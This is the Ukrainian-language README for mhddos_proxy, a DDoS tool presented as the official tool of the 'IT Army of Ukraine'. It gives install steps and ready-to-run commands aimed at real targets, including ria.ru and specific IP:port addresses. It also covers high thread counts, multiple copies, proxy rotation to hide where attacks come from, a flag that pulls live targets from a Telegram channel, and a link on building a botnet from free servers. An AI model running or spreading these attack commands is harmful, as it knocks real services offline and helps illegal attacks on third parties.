## IT Army of Ukraine Official Tool 

# Облачні технології
Для швидкого розвернення, використовуйте Heroku
[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)

### [English Version](/README-EN.md)

- Вбудована база проксі з величезною кількістю IP по всьому світу
- Можливість задавати багато цілей з автоматичним балансуванням навантаження
- Безліч різноманітних методів
- Ефективне використання ресурсів завдяки асихронній архітектурі

### ⏱ Останні оновлення
  
Оновлення версії для Windows | Mac | Linux | Android | Docker: https://telegra.ph/Onovlennya-mhddos-proxy-04-16  

- **24.05.2022** Додано можливість запуску з автоматичним оновленням - див. пункт [Запуск](#2--запуск-наведено-різні-варіанти-цілей)
- **21.05.2022** Додано англійську локалізацію - параметр `--lang EN` (в майбутньому можуть бути додані інші мови)
- **18.05.2022** Додано налаштування `--copies` для запуску декількох копій (рекомендовано до використання при наявності 4+ CPU та мережі > 100 Mb/s).
- **15.05.2022** Повністю оновлена, асинхронна версія, що забезпечує максимальну ефективність та мінімальне навантаження на систему

### 1. 💽 Встановлення

#### Розширені інструкції - [натисніть тут](/docs/installation.md) 

#### Python (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)

Потребує python >= 3.8 та git

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python3 -m pip install -r requirements.txt

#### Docker

Встановіть і запустіть Docker: https://docs.docker.com/desktop/#download-and-install

### 2. 🕹 Запуск (наведено різні варіанти цілей)

#### Python з автоматичним оновленням (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)

    ./runner.sh python3 https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Python (потребує оновлення вручну) (якщо не працює - спробуйте `python` або `python3.10` замість `python3`)

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Docker (для Linux додавайте sudo на початку команди)

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### 3. 🛠 Налаштування (більше у розділі [CLI](#cli))

Усі параметри можна комбінувати, можна вказувати і до і після переліку цілей

- Щоб переглянути інформацію про хід роботи, додайте параметр  `--debug` для тексту, `--table` для таблиці
- Щоб додати ваш IP/VPN до атаки (особливо актуально для виділених серверів), додайте параметр `--vpn`
- Щоб обрати цілі від https://t.me/itarmyofukraine2022, додайте параметр `--itarmy`
- Кількість потоків: `-t XXXX` - за замовчуванням 7500 (або 1000 якщо на машині лише 1 CPU)
- Запуск декількох копій: `--copies X`, при наявності 4+ CPU та мережі > 100 Mb/s

### 4. 📌 Допомогти в пошуку нових проксі для mhddos_proxy
Сам скрипт та інструкції по встановленню тут: https://github.com/porthole-ascend-cinnamon/proxy_finder

### 5. 🐳 Комьюніті
- [Створення ботнету з 30+ безкоштовних та автономних(працюють навіть при вимкненому ПК) Linux-серверів](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
- [Детальний розбір mhddos_proxy та інструкції по встановленню](docs/installation.md)
- [Аналіз засобу mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
- [Приклад запуску через docker на OpenWRT](https://youtu.be/MlL6fuDcWlI)
- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b54)
- [Docker-image](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/docker), який запускає одночасно mhddos_proxy та [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder) (для Linux / Mac додайте sudo на початку):

### 6. CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--http-methods METHOD [METHOD ...]]
                     [--itarmy]
                     [--copies COPIES]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL or local path to file with targets list
      -t, --threads 7500     Number of threads (default is 7500 if CPU > 1, 1000 otherwise)
      --table / --debug      Print log as table / as text
      --vpn                  Use both my IP and proxies. Optionally, specify a percent of using my IP (default is 10%)
      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
      --http-methods GET     List of HTTP(L7) methods to use (default is GET + POST|STRESS).
      --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
      --copies 1             Number of copies to run (default is 1)
      --lang {en,ua}         Select language (default is ua)

### 7. Власні проксі

#### Формат файлу (будь який на вибір):

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password
    protocol://username:password@IP:PORT

де `protocol` може бути одним з 3-ох: `http`|`socks4`|`socks5`, якщо `protocol`не вказувати, то буде обрано `http`  
наприклад для публічного проксі `socks4` формат буде таким:

    socks4://114.231.123.38:3065

а для приватного `socks4` формат може бути одним з таких:

    socks4://114.231.123.38:3065:username:password
    socks4://username:password@114.231.123.38:3065
  
**URL - Віддалений файл для Python та Docker**

    --proxies https://pastebin.com/raw/UkFWzLOt

де https://pastebin.com/raw/UkFWzLOt - ваша веб-сторінка зі списком проксі (кожен проксі з нового рядка)  
  
**path - Шлях до локального файлу, для Python**
  
Покладіть файл у папку з `runner.py` і додайте до команди наступний параметр (замініть `proxies.txt` на ім'я свого файлу)

    --proxies proxies.txt https://ria.ru

де `proxies.txt` - ваша ваш файл зі списком проксі (кожен проксі з нового рядка)
